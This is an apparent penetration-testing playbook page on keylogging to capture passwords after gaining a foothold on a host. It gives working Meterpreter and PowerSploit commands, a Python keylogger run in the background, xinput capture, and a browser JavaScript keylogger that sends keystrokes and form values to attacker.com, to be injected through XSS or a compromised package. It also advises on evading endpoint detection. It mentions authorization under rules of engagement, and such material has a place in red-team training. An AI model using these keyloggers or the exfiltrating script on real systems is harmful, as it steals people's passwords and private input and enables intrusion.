# Password Attacks — Keylogging

## When this applies

- You have a foothold (shell or persistent agent) on a target host.
- Goal: capture passwords (and other sensitive input) entered by interactive users.

## Technique

Install a keylogger that captures keystrokes from logged-in users. Captures:
- Login passwords (entered after foothold).
- Documents containing sensitive text.
- Browser-form data (URLs, search queries, form inputs).
- Chat / IM messages.

## Steps

### 1. Types of keyloggers

| Type | Description | Visibility |
|---|---|---|
| Software user-mode | Captures via Windows hooks (`SetWindowsHookEx`) | Easy to detect |
| Software kernel-mode | Driver-level capture | Stealthier; needs admin |
| Hardware | Physical USB / PS/2 inline device | Bypasses software defenses |
| Web-based | JavaScript keylogger on compromised site | Captures form inputs only |

### 2. Meterpreter keylogger (post-foothold)

```bash
# In Meterpreter session
keyscan_start                    # Begin capture
# Wait for activity (user logs in, types, etc.)
keyscan_dump                      # Dump captured keys
keyscan_stop                      # Stop capture
```

Migrate into a process that has user input first:
```bash
ps                                # List processes
migrate <pid_of_explorer.exe>     # Or browser process
keyscan_start
```

### 3. PowerSploit Get-Keystrokes

```powershell
Import-Module .\Get-Keystrokes.ps1
Get-Keystrokes -LogPath C:\ProgramData\.cache\keys.log
```

`-LogPath` writes to disk; remove when done.

### 4. Custom Python keylogger (Linux X11)

```python
from pynput import keyboard

def on_press(key):
    with open('/tmp/keys.log','a') as f:
        f.write(str(key) + '\n')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

Run in background: `nohup python3 keylog.py &`.

### 5. xdotool / xinput (Linux X11) — non-installation method

```bash
xinput list                                                  # Find keyboard ID
xinput test <id> > /tmp/keys.log &                            # Capture
```

Works without root if X11 access is allowed (DISPLAY env var set).

### 6. macOS — Karabiner / DTrace

DTrace requires SIP-disabled or root with proper entitlements. Generally hard on modern macOS.

### 7. Browser-based keylogger (compromised JS)

```javascript
document.addEventListener('keydown', function(e) {
    fetch('https://attacker.com/log?k=' + encodeURIComponent(e.key));
});

// Or focused on form fields
document.querySelector('form').addEventListener('input', function(e) {
    fetch('https://attacker.com/log?n=' + e.target.name + '&v=' + e.target.value);
});
```

Inject via XSS or compromised supply chain (NPM package, third-party JS).

### 8. Hardware keyloggers

| Device | Notes |
|---|---|
| USB inline (KeyGrabber, KeyDemon) | Plugs between keyboard and computer |
| PS/2 inline | Older hardware; rarely seen |
| Wi-Fi keyloggers | Exfil over Wi-Fi |
| Modified keyboard | Replacement keyboard with built-in logger |

Hardware keyloggers require physical access to the target machine.

### 9. Filter the captured log

```bash
# Find passwords (after "password" prompt)
grep -A1 -i 'password\|login\|signin' keys.log

# Common formats: <username>\n<password>\n<enter>
```

### 10. Stealth considerations

- Endpoint detection systems (CrowdStrike, Defender ATP) flag keystroke-hook syscalls.
- Defender flags PowerSploit / Metasploit signatures.
- Logging to disk is detectable; consider in-memory + periodic exfil.
- HID-class spoofing (USB Rubber Ducky) is a related but different technique (typing automation, not capture).

## Verifying success

- Log file contains user keystrokes from the period after deployment.
- Passwords visible in plain text following login prompts.
- Browser typing captured (URLs, search terms).

## Common pitfalls

- Most modern OSes prompt for "input monitoring" / accessibility permissions on macOS.
- Keystroke encryption (smart cards, hardware tokens with built-in keypads) defeats keyloggers entirely.
- Browser autofill / password manager keystrokes may differ from manually-typed passwords.
- Hardware keyloggers detectable by physical inspection.
- Engagement scope: keylogging requires explicit authorization in most ROEs.

## Tools

- Meterpreter (`keyscan_*`).
- PowerSploit `Get-Keystrokes`.
- pynput (Python).
- xdotool / xinput (Linux X11).
- Hardware (KeyGrabber, KeyDemon, USB Rubber Ducky).

## References

- MITRE ATT&CK T1056.001 (Keylogging).
- CWE-200 (Exposure of Sensitive Information).
- CAPEC-568 (Capture Credentials via Keylogger).
